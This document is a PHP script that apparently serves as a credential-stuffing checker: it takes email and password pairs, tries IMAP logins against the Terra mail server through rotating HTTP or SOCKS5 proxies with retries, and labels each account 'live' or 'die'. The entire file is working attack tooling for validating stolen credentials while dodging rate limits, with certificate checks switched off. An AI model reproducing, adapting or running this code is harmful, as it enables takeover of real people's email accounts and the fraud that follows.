<?php
define('CRLF', chr(13) . chr(10));
define('LF', chr(10));
define('DQ', chr(34));

while (ob_get_level() > 0) { @ob_end_clean(); }
ob_start();

error_reporting(0);
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
ini_set('log_errors', '0');
ini_set('max_execution_time', '120');

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = isset($_GET['action']) ? $_GET['action'] : '';

if ($action === 'init') {
    $proxies = array();
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode(LF, $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            $proxies[] = $line;
        }
    }
    ob_end_clean();
    echo json_encode(array('status' => 'ok', 'proxies' => array_values(array_unique($proxies))));
    exit;
}

if ($action === 'test_proxy') {
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(array('status' => 'fail'));
        exit;
    }
    $ok = testProxy($proxy);
    ob_end_clean();
    echo json_encode(array('status' => $ok ? 'ok' : 'fail'));
    exit;
}

if ($action === 'diag_proxy') {
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(array('status' => 'fail', 'msg' => 'Proxy vazio'));
        exit;
    }
    $p = parseProxy($proxy);
    $diag = array('proxy' => $proxy, 'parsed' => $p, 'tests' => array());

    $t0 = microtime(true);
    $sock = @fsockopen($p['host'], $p['port'], $errno, $errstr, 10);
    $diag['tests']['tcp'] = array(
        'ok' => $sock !== false,
        'time_ms' => round((microtime(true) - $t0) * 1000),
        'err' => $sock === false ? sprintf('%s (%d)', $errstr, $errno) : null,
    );
    if ($sock) fclose($sock);

    $t0 = microtime(true);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    if ($p['type'] === 'socks5') {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
    } else {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    }
    if (!empty($p['user'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
    $res = curl_exec($ch);
    $diag['tests']['https_curl'] = array(
        'ok' => $res !== false,
        'ip' => $res !== false ? trim($res) : null,
        'time_ms' => round((microtime(true) - $t0) * 1000),
        'err' => curl_error($ch),
        'errno' => curl_errno($ch),
    );
    curl_close($ch);

    if ($p['type'] === 'socks5') {
        $diag['tests']['socks5_manual'] = testSocks5Connect($proxy, 20);
    } else {
        $diag['tests']['http_connect_manual'] = testHttpConnect($proxy, 20);
    }

    ob_end_clean();
    echo json_encode($diag, JSON_PRETTY_PRINT);
    exit;
}

if ($action === 'check') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($email) || empty($password)) {
        ob_end_clean();
        echo json_encode(array('status' => 'die', 'email' => $email, 'reason' => 'Vazio'));
        exit;
    }
    try {
        $result = doValidate($email, $password, $proxy);
    } catch (\Throwable $e) {
        $result = array('status' => 'die', 'email' => $email, 'reason' => 'Erro');
    }
    ob_end_clean();
    echo json_encode($result);
    exit;
}

ob_end_clean();
echo json_encode(array('status' => 'ok'));
exit;

function parseProxy($proxy) {
    $host = '';
    $port = 0;
    $user = '';
    $pass = '';
    $type = 'http';

    $lower = strtolower($proxy);
    if (strpos($lower, 'socks5') === 0) $type = 'socks5';
    elseif (strpos($lower, 'socks4') === 0) $type = 'socks4';

    if (preg_match('#^(socks[45]h?|https?)://([^:@]+):([^@]+)@([^:]+):(\d+)$#i', $proxy, $m)) {
        $user = $m[2]; $pass = $m[3]; $host = $m[4]; $port = (int)$m[5];
    } elseif (preg_match('#^([^:@]+):([^@]+)@([^:]+):(\d+)$#', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    } elseif (preg_match('#^(socks[45]h?|https?)://([^:]+):(\d+)$#i', $proxy, $m)) {
        $host = $m[2]; $port = (int)$m[3];
    } elseif (preg_match('#^([^:]+):(\d+)$#', $proxy, $m)) {
        $host = $m[1]; $port = (int)$m[2];
    }

    return array('host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass, 'type' => $type);
}

function testProxy($proxy) {
    if (!extension_loaded('curl')) return false;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return false;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    if ($p['type'] === 'socks5') {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
    } else {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    }
    if (!empty($p['user'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
    $result = curl_exec($ch);
    curl_close($ch);
    return ($result !== false && strlen(trim($result)) > 0);
}

function doValidate($email, $password, $proxy) {
    $timeout = 20;
    $delays = array(0, 2000000, 4000000, 7000000, 10000000);

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        if (!empty($proxy)) {
            $p = parseProxy($proxy);
            if ($p['type'] === 'socks5') {
                $r = trySocks5Imap($email, $password, $timeout, $p);
                if ($r !== null) return $r;
            } else {
                $r = tryHttpConnectImap($email, $password, $timeout, $p);
                if ($r !== null) return $r;
            }
        } else {
            if (extension_loaded('curl')) {
                $r = tryCurlDirect($email, $password, $timeout);
                if ($r !== null) return $r;
            }
            $r = trySocketDirect($email, $password, $timeout);
            if ($r !== null) return $r;
        }
    }

    return array('status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true);
}

function trySocks5Imap($email, $password, $timeout, $p) {
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    stream_set_blocking($socket, true);

    fwrite($socket, chr(5) . chr(2) . chr(0) . chr(2));
    $greeting = @fread($socket, 2);
    if (strlen($greeting) < 2) { fclose($socket); return null; }
    $method = ord($greeting[1]);

    if ($method === 2) {
        $u = $p['user'];
        $s = $p['pass'];
        $auth = chr(1) . chr(strlen($u)) . $u . chr(strlen($s)) . $s;
        fwrite($socket, $auth);
        $authResp = @fread($socket, 2);
        if (strlen($authResp) < 2 || ord($authResp[1]) !== 0) { fclose($socket); return null; }
    } elseif ($method !== 0) {
        fclose($socket); return null;
    }

    $target = 'imap.terra.com.br';
    $connectReq = chr(5) . chr(1) . chr(0) . chr(3) . chr(strlen($target)) . $target . pack('n', 993);
    fwrite($socket, $connectReq);

    $resp = '';
    $deadline = microtime(true) + $timeout;
    while (strlen($resp) < 10 && !feof($socket) && microtime(true) < $deadline) {
        $chunk = @fread($socket, 10 - strlen($resp));
        if ($chunk === false || $chunk === '') { usleep(100000); continue; }
        $resp .= $chunk;
    }
    if (strlen($resp) < 10 || ord($resp[1]) !== 0) { fclose($socket); return null; }

    if (!enableTLS($socket, $timeout)) { fclose($socket); return null; }
    return doImapLogin($socket, $email, $password, $timeout);
}

function tryHttpConnectImap($email, $password, $timeout, $p) {
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    stream_set_blocking($socket, true);

    $target = 'imap.terra.com.br';
    $req = 'CONNECT ' . $target . ':993 HTTP/1.1' . CRLF;
    $req .= 'Host: ' . $target . ':993' . CRLF;
    if (!empty($p['user'])) {
        $auth = base64_encode($p['user'] . ':' . $p['pass']);
        $req .= 'Proxy-Authorization: Basic ' . $auth . CRLF;
    }
    $req .= 'Proxy-Connection: Keep-Alive' . CRLF . CRLF;
    fwrite($socket, $req);

    $resp = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $resp .= $line;
        if ($line === CRLF || $line === LF) break;
    }
    if (stripos($resp, '200') === false) { fclose($socket); return null; }

    if (!enableTLS($socket, $timeout)) { fclose($socket); return null; }
    return doImapLogin($socket, $email, $password, $timeout);
}

function enableTLS($socket, $timeout) {
    $deadline = microtime(true) + $timeout;
    while (microtime(true) < $deadline) {
        $r = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
        if ($r === true) return true;
        if ($r === false) return false;
        usleep(100000);
    }
    return false;
}

function doImapLogin($socket, $email, $password, $timeout) {
    $greeting = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $greeting .= $line;
        if (strpos($line, LF) !== false) break;
    }
    if (stripos($greeting, 'OK') === false) { fclose($socket); return null; }

    $safe_email = addslashes($email);
    $safe_pass = addslashes($password);
    $cmd = 'A1 LOGIN ' . DQ . $safe_email . DQ . ' ' . DQ . $safe_pass . DQ . CRLF;
    fwrite($socket, $cmd);

    $response = '';
    $deadline2 = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline2) break;
    }
    @fwrite($socket, 'A2 LOGOUT' . CRLF);
    fclose($socket);

    if (preg_match('/A1\s+OK/i', $response)) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    if (preg_match('/A1\s+NO/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if (preg_match('/A1\s+BAD/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    return null;
}

function testSocks5Connect($proxy, $timeout) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) return array('ok' => false, 'err' => 'Parse failed');

    $t0 = microtime(true);
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => sprintf('fsockopen: %s (%d)', $errstr, $errno));
    stream_set_timeout($socket, $timeout);

    fwrite($socket, chr(5) . chr(2) . chr(0) . chr(2));
    $g = @fread($socket, 2);
    if (strlen($g) < 2) { fclose($socket); return array('ok' => false, 'err' => 'SOCKS5 greeting failed'); }
    $method = ord($g[1]);
    if ($method === 2) {
        $auth = chr(1) . chr(strlen($p['user'])) . $p['user'] . chr(strlen($p['pass'])) . $p['pass'];
        fwrite($socket, $auth);
        $ar = @fread($socket, 2);
        if (strlen($ar) < 2 || ord($ar[1]) !== 0) { fclose($socket); return array('ok' => false, 'err' => 'SOCKS5 auth failed'); }
    }
    $target = 'imap.terra.com.br';
    fwrite($socket, chr(5) . chr(1) . chr(0) . chr(3) . chr(strlen($target)) . $target . pack('n', 993));
    $resp = '';
    $dl = microtime(true) + $timeout;
    while (strlen($resp) < 10 && microtime(true) < $dl) {
        $c = @fread($socket, 10);
        if ($c === false || $c === '') { usleep(50000); continue; }
        $resp .= $c;
    }
    if (strlen($resp) < 10 || ord($resp[1]) !== 0) { fclose($socket); return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'SOCKS5 connect to 993 rejected: ' . bin2hex($resp)); }

    $tls = enableTLS($socket, $timeout);
    if (!$tls) { fclose($socket); return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'TLS failed'); }

    $greeting = '';
    $dl2 = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $dl2) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $greeting .= $line;
        if (strpos($line, LF) !== false) break;
    }
    fclose($socket);
    $timeMs = round((microtime(true) - $t0) * 1000);
    if (stripos($greeting, 'OK') === false) return array('ok' => false, 'time_ms' => $timeMs, 'err' => 'No IMAP greeting', 'greeting' => substr($greeting, 0, 200));
    return array('ok' => true, 'time_ms' => $timeMs, 'greeting' => substr($greeting, 0, 200));
}

function testHttpConnect($proxy, $timeout) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) return array('ok' => false, 'err' => 'Parse failed');

    $t0 = microtime(true);
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => sprintf('fsockopen: %s (%d)', $errstr, $errno));
    stream_set_timeout($socket, $timeout);

    $target = 'imap.terra.com.br';
    $req = 'CONNECT ' . $target . ':993 HTTP/1.1' . CRLF . 'Host: ' . $target . ':993' . CRLF;
    if (!empty($p['user'])) {
        $auth = base64_encode($p['user'] . ':' . $p['pass']);
        $req .= 'Proxy-Authorization: Basic ' . $auth . CRLF;
    }
    $req .= CRLF;
    fwrite($socket, $req);

    $resp = '';
    $dl = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $dl) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $resp .= $line;
        if ($line === CRLF || $line === LF) break;
    }
    if (stripos($resp, '200') === false) { fclose($socket); return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'CONNECT rejected', 'response' => substr($resp, 0, 300)); }

    $tls = enableTLS($socket, $timeout);
    if (!$tls) { fclose($socket); return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'TLS failed'); }

    $greeting = '';
    $dl2 = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $dl2) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $greeting .= $line;
        if (strpos($line, LF) !== false) break;
    }
    fclose($socket);
    $timeMs = round((microtime(true) - $t0) * 1000);
    if (stripos($greeting, 'OK') === false) return array('ok' => false, 'time_ms' => $timeMs, 'err' => 'No IMAP greeting', 'greeting' => substr($greeting, 0, 200));
    return array('ok' => true, 'time_ms' => $timeMs, 'greeting' => substr($greeting, 0, 200));
}

function tryCurlDirect($email, $password, $timeout) {
    if (!extension_loaded('curl')) return null;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
    curl_setopt($ch, CURLOPT_USERNAME, $email);
    curl_setopt($ch, CURLOPT_PASSWORD, $password);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);
    if ($errno === 67) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if ($result !== false) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    return null;
}

function trySocketDirect($email, $password, $timeout) {
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    $greeting = @fgets($socket, 8192);
    if (!$greeting || stripos($greeting, 'OK') === false) { fclose($socket); return null; }
    $safe_email = addslashes($email);
    $safe_pass = addslashes($password);
    $cmd = 'A1 LOGIN ' . DQ . $safe_email . DQ . ' ' . DQ . $safe_pass . DQ . CRLF;
    fwrite($socket, $cmd);
    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline) break;
    }
    @fwrite($socket, 'A2 LOGOUT' . CRLF);
    fclose($socket);
    if (preg_match('/A1\s+OK/i', $response)) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    if (preg_match('/A1\s+NO/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if (preg_match('/A1\s+BAD/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    return null;
}
